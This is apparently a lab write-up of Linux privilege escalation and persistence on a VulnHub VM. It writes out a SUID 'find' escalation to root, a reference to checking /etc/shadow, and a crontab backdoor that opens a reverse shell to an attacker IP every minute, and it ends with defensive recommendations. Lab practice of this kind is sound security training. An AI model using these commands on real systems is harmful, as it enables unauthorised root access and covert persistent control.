Privilege Escalation & Persistence Lab
📌 Lab Overview

This lab simulates post-exploitation on a vulnerable Linux VM. The objective was to enumerate the system, identify privilege escalation vectors, gain root access, and establish persistence for continued access.

🛠️ Tools Used
Meterpreter (initial foothold & shell access)
LinPEAS (enumeration)
PowerSploit (reference for privilege escalation techniques)
🎯 Target
Target IP: 192.168.1.150
Environment: VulnHub VM (Local Lab)
🚀 Workflow
1. Initial Access
Gained a low-privilege shell via Meterpreter session
Stabilized shell using:
python3 -c 'import pty; pty.spawn("/bin/bash")'
2. Enumeration (LinPEAS)

Uploaded and executed LinPEAS:

chmod +x linpeas.sh
./linpeas.sh
🔍 Key Findings
SUID binaries detected:
/usr/bin/find
/usr/bin/nmap
Writable directories in /tmp
Weak file permissions on certain scripts
📊 Escalation Log
Task ID	Technique	Target IP	Status	Outcome
010	SUID Exploit	192.168.1.150	Success	Root Shell
🔓 Privilege Escalation
Exploiting SUID Binary (find)

Checked SUID permissions:

ls -la /usr/bin/find

Exploit used:

find . -exec /bin/sh -p \; -quit
Result:
whoami
root

✅ Root access successfully obtained

🧩 Post-Exploitation Notes
Verified root privileges
Checked /etc/shadow access
Enumerated cron jobs and services
🔁 Persistence Setup
Method: Cron Job Backdoor

Added a cron job to maintain access:

echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" >> /etc/crontab

Started listener on attacker machine:

nc -lvnp 4444
📌 Persistence Summary (50 Words)

A cron job was added to the system crontab to execute a reverse shell every minute. This ensures persistent access even if the session is lost. The payload connects back to the attacker machine, re-establishing control without requiring re-exploitation of the target system.

✅ Checklist
 Gained initial shell (Meterpreter)
 Uploaded and executed LinPEAS
 Identified SUID vulnerabilities
 Exploited SUID binary for root access
 Verified privilege escalation
 Established persistence via cron job
🛡️ Recommendations
Remove unnecessary SUID binaries
Apply least privilege principle
Monitor cron jobs and system modifications
Use file integrity monitoring (FIM)
Regularly patch kernel vulnerabilities
📁 Notes
